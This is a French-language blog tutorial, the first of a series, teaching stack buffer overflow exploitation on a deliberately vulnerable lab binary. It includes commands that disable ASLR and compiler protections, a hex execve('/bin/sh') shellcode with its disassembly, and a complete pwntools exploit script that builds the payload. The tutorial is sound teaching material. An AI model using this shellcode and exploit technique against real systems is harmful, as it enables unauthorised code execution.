---
author: "Laluka"
title: "PWN 1/4 : Buffer Overflow, là où tout a commencé"
slug: "pwn_1of4_buffer_overflow"
date: 2018-05-03
description: "Introcution à l'exploitation binaire, aux format ELF et à l'écriture de shellcode. "
---

 > Petit mot avant de commencer : Ces quatres articles ont donné lieu à une conférence d'introduction au pwn à la HitchHack 2018. La vidéo est disponible (francais uniquement) ici :

 [![1, 2, 3, PWNED !](http://img.youtube.com/vi/hmt8M9YLwTg/0.jpg)](https://www.youtube.com/watch?v=hmt8M9YLwTg)

## printf("Mme, Mr %s, bonjour. ", lecteur);

Aujourd'hui, je vous propose un article plus hardu, un article plus poilu, un article plus barbu, en bref, un article qui pète des culs !

<img class="img_med" src="/hacking/pwn_1of4_buffer_overflow/patrick.jpg" alt="patrick" >

La notion abordée aujourd'hui est assez poussée, donc je sais que parmi les lecteurs habituels, vous serez nombreux à ne pas forcément pouvoir comprendre la totalité de l'article, c'est pourquoi je vais tenter de le rendre intéressant même pour les néophytes. Donc si vous êtes un apprenti sorcier, acharnez vous, profitez en, sinon, regardez ca comme un tour de magie noir, c'est beau, c'est puissant, mais il n'est pas nécessaire de tout comprendre pour apprécier :)

Cet article est donc le premier d'une petite série dédiée aux buffers overflow !

Dernière chose avant de commencer... \
Merci à Cyril Bresch qui m'a donné le droit d'utiliser certains de ses exos pour cette introduction aux buffers overflow. Mais surtout merci à lui pour m'avoir initié à l'exploitation binaire (Bon, ok t'étais payé, but still ! :D ). \
Son site perso est dispo ici : <https://cyrilbresch.fr/>

En prévision, des shellcodes, de l'assembleur, du ret2libc, du rop, et bien plus encore. Ces mots ne vous disent rien ? C'est normal, ne vous en faites pas, on va commencer tranquilou avec une mise en contexte.

Je vais tenter une définition récursive : Je commence par définir le coeur du sujet, et à chaque fois qu'un terme nouveau apparait, je le défini juste après. Ceci devrait permettre, je l'espère, une lecture fluide ! :)

## Buffer overflow, Keskecé ?

 * Buffer :

Petit espace dans lequel on va stocker de l'information dans un programme. La plupart du temps, ce buffer, ou tampon, va contenir des caractères, ou une suite de nombres, ou peu importe, de toute facon, c'est des bits collés les uns aux autres qui forment des bytes. Les buffers sont la plupart du temps stockés sur le heap ou dans la stack.

 * Overflow :

Action de dépasser la taille initialement prévue pour un buffer, affectant ainsi les valeurs stockées après ledit buffer. Là où en tant que hackeur on est content, c'est que pleins de données très utiles peuvent se trouver après le buffer. Le cas le plus arrangeant étant de contrôler le registre d'instructions, qui dit quel code doit être exécuté. Arriver à l'affecter, et le tour est joué !\
 Il existe de nombreuses facons d'effectuer un overflow, mais également un grand nombre de protections mises en place.

 * Programme :

"Bah je sais ce que c'est un programme, tu click et ca se lance tavu !"

Oui... Mais non. Dans l'idée c'est ca, mais la plupart des programmes fonctionnent en ligne de commande, c'est à dire qu'on les lance en tapant des commandes dans un shell. Contrairement à windows, ou le plus souvent c'est l'extension du nom du fichier (.txt, .exe, ...) qui détermine son type, sous linux, ce n'est que très rarement utilisé, et tant mieux car cette pratique est une énorme faille de sécurité. Plus d'infos sur la faille ici : [article_RTLO](https://blog.malwarebytes.com/cybercrime/2014/01/the-rtlo-method/)

Ce qui remplace cette pratique est l'usage de magic number. En bref, c'est une suite de bytes que l'on met en début de fichier et qui permet de connaître le type et la version du fichier. Ici, pour un programme, ELF sous linux, on voit :

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/readelf.png" alt="readelf" >

Deux choses notables :\
 - 45 4c 46 est le code ASCII de ELF : Executable and Linkable Format\
 - Type d'architecture pour le lancer : X86-64, donc du 64 bits.

 * Architecture :

Il existe de nombreux types de processeurs, et chaque processeur à son propre jeu d'instructions. Bien que des standards soient adoptés par les constructeurs, chaque processeur garde ses particularités. Une liste non exhaustive disponible ici : <https://en.wikipedia.org/wiki/List_of_instruction_sets>

Les architectures les plus courantes sont : x86, x86-64, arm, mips, ...

x86 désigne l'habituel 32bits, et x86-64 le 64 bits. Cette différence est due à la taille des registres utilisés pour la gestion des adresses et opérations. Un programme 32 marchera sur 32/64, un programme 64 uniquement sur du 64.

 * Linux :

Linux is not Unix. Si vous en êtes là, il n'est jamais trop tard ! En bref, une grande famille d'OS open source.

[Introduction linux](https://openclassrooms.com/courses/reprenez-le-controle-a-l-aide-de-linux/mais-c-est-quoi-linux)

 * Shell :

Un shell est un interpréteur de commandes. Vu de loin, c'est là ou les gens à capuche tapent des lignes de code en vert sur fond noir. Il y en a sous tous les OS communs car c'est indispensable pour communiquer avec le système. Attention, pour un système, il existe plusieurs implémentations, plusieurs versions.

Exemple (linux) : sh / bash / dash / zsh / fish / ...

 * Stack :

La pile est un endroit utilisé par le processeur pour stocker des données. C'est un fonctionnement LastInFirstOut. Autrement dit, le dernier élément qui arrive est le premier à sortir.

<img class="img_med" src="/hacking/pwn_1of4_buffer_overflow/stack.png" alt="stack" >

 * Heap :

Le tas permet aussi de stocker des données, mais de manière plus dynamique. Il est utilisé (entre autre) lors de l'usage de fonctions type malloc (allocation de mémoire en cours d'exécution du programme).

 * Fonction :

Suite d'instructions assembleur commencant (le plus souvent...) par faire de la place sur la stack pour traiter des données en local, et se terminant par leave et ret afin de laisser le programme appelant reprendre au point d'appel.

 * Shellcode :

Suite d'instructions assembleur permettant d'invoquer un shell.

 * Bits :

 Une donnée valant 0 ou 1, unité insécable.

 * Byte :

 Suite de 8 bits, codant donc un entier compris entre 0 et 255.

Allez, petite pause, on respire un grand coup, on se redresse sur sa chaise...\
Et on y retourne !

## Désactiver les sécurités :

La première chose à faire pour une première approche est de désactiver les protections mises en place, car aborder le sujet avec toutes les protections actuellement utilisées : RIP !

On commence par désactiver l'ASLR, c'est un paramètre du kernel (noyau du système, ce qui gère tout le reste) qui indique s'il faut oui ou non placer les différents segments d'un programme à des adresses aléatoires. Ici, on va utiliser la stack, on ne veut donc pas de randomisation afin de faciliter l'exploit.

```shell
$ # En tant que root :
$ echo 0 > /proc/sys/kernel/randomize_va_space
```

On va ensuite compiler le programme de manière à ce que :

-   Il n'y ait pas de stack canary, autrement dit, pas de valeur placée en fin de buffer, qui est vérifiée et hurle à la mort si on l'a écrasée (donc si elle détecte un buffer overflow)

-   La stack soit exécutable, sinon, un bit NX y est placé. Ce bit d'information signifie qu'il n'est pas possible d'exécuter les données (ici instructions assembleur) qui s'y trouvent. Il nous est donc impossible pour nous d'exécuter le code de notre choix.

-   Le Position Independent Code soit désactive (ne pas placer à des endroits aléatoires les différents segments de notre programme).

On utilise donc la ligne de compilation suivante :

```shell
$ gcc -o vuln -fno-stack-protector -no-pie -z execstack vuln.c
```

Nous allons également avoir besoin de quelques outils :

* python : Langage et interpréteur, version 2 pour raisons d'encodage moins chiant

* gdb : Gnu debugger, utile pour comprendre ce qu'il se passe dans le programme

* gdb-peda : gdb amélioré avec du scripting python, facilite l'utilisation de gdb

* pwntool : Peu utilisé ici, cet outil python permet de faciliter l'exploit binaire

## Reconnaissance :

Le binaire étudié est téléchargable [ici](/hacking/pwn_1of4_buffer_overflow/vuln) !

Ok, il prend un argument. Il en fait quoi ?

A priori, rien... Prog de test, osef ! `¯\_(ツ)_/¯`

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/recon.png" alt="recon" >

Trouver le point de crash :

La strat habituelle de débutant, des arguments longs.

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/crash.png" alt="crash" >

Ah, ca, ca sent bon !

On a qu'a lui donner un argument long pour le faire crash !

Recherche de l'offset :

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/pattern_create.png" alt="pattern_create" >

Créer le pattern (schéma facilement reconnaissable qui va servir à comprendre quels registres sont atteignables par notre input), puis lancer le programme avec le pattern en paramètre.

On voit ici que le crash survient sur l'instruction ret (section code, petite flèche à gauche).

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/pattern_run.png" alt="pattern_search" >

Après le crash, on cherche le pattern dans la mémoire :

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/pattern_search.png" alt="pattern_search" >

L'analyse de la mémoire a retrouvé des morceaux de notre pattern à différents endroits, on voit donc que le RSP (Registre Stack Pointer) est à une distance de 40 bytes de notre début d'input.

Mais nous savons déjà que le crash survient sur un ret. Ret est une instruction qui place le dernier élément de la pile dans RIP (Instruction Pointer) pour retourner au programme principal afin de poursuivre son exécution. Donc contrôler RSP avant un ret, c'est contrôler RIP. Contrôler RIP, c'est pouvoir détourner le flot d'exécution du programme, et...

Et c'est gagné du coup ! ^~^

Recherche du Shellcode :

On sait maintenant à peu près où on va injecter. Ce qu'il nous faut maintenant c'est un shellcode, un bon, un vrai ! :D

Petit tour sur shellstorm ou exploit-db, choisir la bonne architecture, ...

Pour ma part il est fait maison, ou plutôt refait maison, car l'idée générale reste la mêm : Placer les bons paramètres dans les registres, puis déclencher un syscall pour que le kernel exécute ce que l'on veut, ici un shell.

Shellcode :

 `\x48\xB8\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xE8\x08\x50\x48\x89\xE7\x48\x31\xC0\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x0F\x05`

On va quand même le désassembler pour comprendre ce qu'il fait, et ce grâce à ce site : <https://onlinedisassembler.com>

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/shellcode.png" alt="shellcode" >

    0  :  "//bin/sh" dans rax
    A  : "/bin/sh\x00" dans rax
    E  : mettre rax en pile
    F  : rdi pointe vers la pile
    12 :  0 dans rax
    15 : 59 dans rax (execve)
    17 : 0 dans rsi
    1a : 0 dans rdx
    1d :  Initier le syscall

Ceci va donc exécuter /bin/sh à l'aide du syscall de execve.

Les paramètres à utiliser sont trouvés à l'aide de cette doc :\
https://w3challs.com/syscalls/?arch=x86_64

## Développement de l'exploit

On veut donc arriver à mettre notre shellcode à un endroit connu, puis atteindre une taille de 40 bytes pour y placer l'adresse du shellcode à exécuter. Yapluka !

Notre payload (données envoyées lors de l'attaque) aura donc la forme suivante : PADDING + SHELLCODE + ADRESSE_SHELLCODE

Afin de trouver où se situent les données entrées par l'utilisateur, dans gdb :

On désassemble le main (convention de nom pour la fonction principale du programme), défini un point d'arrêt avant la fin de l'exécution, puis le lance avec AAAA en paramètre.

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/disas_main.png" alt="disas_main" >

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/find.png" alt="find" >

Une fois arrêté, notre input se trouve donc dans la stack, à l'adresse : 0x7fffffffe570

Et notre shellcode se trouvera un peu après l'input, à cause du padding.

Code python de l'exploit :

```python
#!/usr/bin/env python2

from pwn import *

def save(what, where):
  with open(where, "wb") as f:
    f.write(what)

shellcode = "\x48\xB8\x2F\x2F\x62\x69\x6E\x2F\x73\x68"
shellcode += "\x48\xC1\xE8\x08\x50\x48\x89\xE7\x48\x31"
shellcode += "\xC0\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x0F\x05"

offset = 40
count_A = offset - len(shellcode)
padding = "A" * count_A
addr_input = 0x7fffffffe570 # Depends on your OS
addr_shellcode = addr_input + count_A
log.info("Shellcode at 0x{:8x}".format(addr_shellcode))

payload = padding + shellcode + p64(addr_shellcode)

save(payload, "payload")
log.success("Payload written")
```

Pour lancer l'exploit, il n'y a plus qu'à donner le contenu du fichier exploit au programme en tant qu'argument :

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/run_exploit.png" alt="run_exploit" >

Et BIM ! Spawned a shell ! \o/

<img class="img_small" src="/hacking/pwn_1of4_buffer_overflow/like_a_boss.png" alt="like_a_boss" >

## Remarques et Réflexion :

 * Remarque 1

Dans cet exemple, une erreur s'est dissimulée, sauras tu la retrouver ?

 -[ SPOIL ]-

Ce shellcode contient des null-bytes (\x00 ou encore sentinelle, qui en C, désigne une fin de chaine de caractère) qui sont très mal gérés par bash. Si l'argument avait été passé directement, bash l'aurait coupé. Passer par un fichier permet de tout envoyer au programme, même les null-bytes. Mais ceci ne règle pas le problème en totalité. En effet, la fonction vulnérable ici est strcpy. Elle copie un string et s'arrête à la première sentinelle (aka null-byte, aka \x00, aka 0x00, aka ShellCodeBreakerOfDoom). Notre exploit fonctionne quand même car ils apparaissent à la fin, et dans une adresse. Et nous collons cette adresse de stack sur... Une adresse de stack, donc les 0x00 dont déjà présents.

Réflexion : Comment corriger le shellcode pour qu'il n'utilise plus de null-byte ?

 * Remarque 2

Cet exemple est limité car la taille disponible pour l'overflow est très petite. Cela suffit pour pop un shell, mais pas pour bien plus. De plus, cet espace étant près des adresses utilisées, il est possible qu'il soit altéré durant l'exécution. Embêtant non ?

Réflexion : Comment utiliser un shellcode de taille arbitrairement longue ?

 * Remarque 3

Cet exemple ne fonctionne que si l'ASLR est désactivé car il dépend fortement de la pile. Il existe de nombreuses facons de contourner l'ASLR... Suite dans les prochains articles... Au compte goutte ! :D

Mais... Tu as lu jusqu'ici ? Chapal l'ami !

T'es un magicien, maintenant ! Ou presque... ;)

<img class="img_small" src="/hacking/pwn_1of4_buffer_overflow/blair.png" alt="blair" >

Ceci étant mon premier article sur le sujet, je sais qu'il sera incomplet, et plein d'imprécisions si ce n'est d'erreurs. N'hésitez pas à m'indiquer les coquilles trouvées, détails manquants etc... ^.^

 * Hints :

-Utiliser des... Xor ? Add ? Sub ? Autre ?\
-Variables d'environnement ? Ordre padding / payload dans l'exploit ?

En espérant que ce premier pas dans le monde du pwn vous ait plu,
